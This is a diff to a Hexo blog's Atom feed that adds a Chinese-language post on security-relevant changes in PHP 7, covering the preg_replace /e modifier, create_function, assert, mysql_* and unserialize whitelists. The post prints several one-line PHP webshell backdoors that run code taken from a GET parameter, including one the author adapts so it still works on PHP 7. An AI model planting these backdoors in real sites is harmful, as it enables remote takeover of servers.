@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-05-22T13:48:18.867Z</updated>
+  <updated>2019-05-22T13:55:56.558Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>php7部分安全改动</title>
+    <link href="http://yoursite.com/2019/05/22/php7%E9%83%A8%E5%88%86%E5%AE%89%E5%85%A8%E6%94%B9%E5%8A%A8/"/>
+    <id>http://yoursite.com/2019/05/22/php7部分安全改动/</id>
+    <published>2019-05-22T13:52:22.000Z</published>
+    <updated>2019-05-22T13:55:56.558Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="函数变动"><a href="#函数变动" class="headerlink" title="函数变动"></a>函数变动</h2><h3 id="preg-replace函数的-e修饰符被移除"><a href="#preg-replace函数的-e修饰符被移除" class="headerlink" title="preg_replace函数的\e修饰符被移除"></a>preg_replace函数的\e修饰符被移除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    preg_replace(&quot;/.*/e&quot;,$_GET[&apos;h&apos;],&quot;.&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>php5可以使用上述代码构建后门<br>但是到了php7，不再支持\e修饰符，取而代之的是<code>preg_replace_callback()</code>函数。<br><img src="/2019/05/22/php7部分安全改动/1.PNG" alt="1"><br>实际上只需稍许改动，我们就能重新凭借该函数构建我们的后门。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> preg_replace_callback(&quot;/.*/&quot;,function ($a)&#123;@eval($a[0]);&#125;,$_GET[&quot;h&quot;]);</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/22/php7部分安全改动/2.PNG" alt="2"></p><h3 id="create-function函数被废弃"><a href="#create-function函数被废弃" class="headerlink" title="create_function函数被废弃"></a>create_function函数被废弃</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=create_function(&quot;&quot;,$_GET[&apos;h&apos;]);</span><br><span class="line">$a();</span><br></pre></td></tr></table></figure><p>在php7.2版本，使用上述代码会产生警告，但是依旧能够执行；在此之前的版本，则不会产生任何警告。<br><img src="/2019/05/22/php7部分安全改动/3.PNG" alt="3"></p><h3 id="mysql-系列移除"><a href="#mysql-系列移除" class="headerlink" title="mysql_*系列移除"></a>mysql_*系列移除</h3><p>php7已经不再能够使用mysql_*系列函数，推荐使用mysqli或者pdo_mysql。<br><img src="/2019/05/22/php7部分安全改动/4.PNG" alt="4"></p><h3 id="unserialize增加可选白名单参数"><a href="#unserialize增加可选白名单参数" class="headerlink" title="unserialize增加可选白名单参数"></a>unserialize增加可选白名单参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$data = unserialize($serializedObj1 , [&quot;allowed_classes&quot; =&gt; true]);</span><br><span class="line">$data2 = unserialize($serializedObj2 , [&quot;allowed_classes&quot; =&gt; [&quot;MyClass1&quot;, &quot;MyClass2&quot;]]);</span><br></pre></td></tr></table></figure><p>如果反序列化之后的类名不在指定的白名单中，那么就会产生错误。<br>而如果将其参数设置为<code>true</code>，也就是无限制。如果设置为<code>false</code>，那么所有的对象都会转换为<code>__PHP_Incomplete_Class</code></p><h3 id="assert-7-2版本以上不再能够执行代码"><a href="#assert-7-2版本以上不再能够执行代码" class="headerlink" title="assert 7.2版本以上不再能够执行代码"></a>assert 7.2版本以上不再能够执行代码</h3><p>可以使用eval进行代替，但是使用assert执行代码的后门基本都不能用了，包括熟悉的菜刀。</p><h2 id="其他改动"><a href="#其他改动" class="headerlink" title="其他改动"></a>其他改动</h2><h3 id="十六进制字符串不再被认为是数字"><a href="#十六进制字符串不再被认为是数字" class="headerlink" title="十六进制字符串不再被认为是数字"></a>十六进制字符串不再被认为是数字</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump(&quot;0x123&quot; == &quot;291&quot;);</span><br><span class="line">var_dump(is_numeric(&quot;0x123&quot;));</span><br><span class="line">var_dump(&quot;0xe&quot; + &quot;0x1&quot;);</span><br><span class="line">var_dump(substr(&quot;foo&quot;, &quot;0x1&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/22/php7部分安全改动/5.PNG" alt="5"></p><h3 id="ASP、script-PHP标签被移除"><a href="#ASP、script-PHP标签被移除" class="headerlink" title="ASP、script PHP标签被移除"></a>ASP、script PHP标签被移除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%   %&gt;</span><br><span class="line">&lt;%=  %&gt;</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;     &lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上述标签都已经被干掉了，也就是说只有&lt;?php?&gt;这样的才能在php7上运行。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本上很多能够利用的东西以及CTF里面的小套路都随着php7的更新而不能用了，个人认为影响挺大的莫过于assert不能用了，意味着很多马都得回炉重造；而mysql_*家族的移除，也意味着预编译的普及，可能sql注入的洞会越来越难找。但是php7也有一些新的东西，说不定能重新为之利用，只是现在还没有发掘出来。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/articles/web/197013.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/197013.html</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;函数变动&quot;&gt;&lt;a href=&quot;#函数变动&quot; class=&quot;headerlink&quot; title=&quot;函数变动&quot;&gt;&lt;/a&gt;函数变动&lt;/h2&gt;&lt;h3 id=&quot;preg-replace函数的-e修饰符被移除&quot;&gt;&lt;a href=&quot;#preg-replace函数的-e修饰符被移
+      
+    
+    </summary>
+    
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+  </entry>
   
   <entry>
     <title>使用samba绕过allow_url_include限制</title>
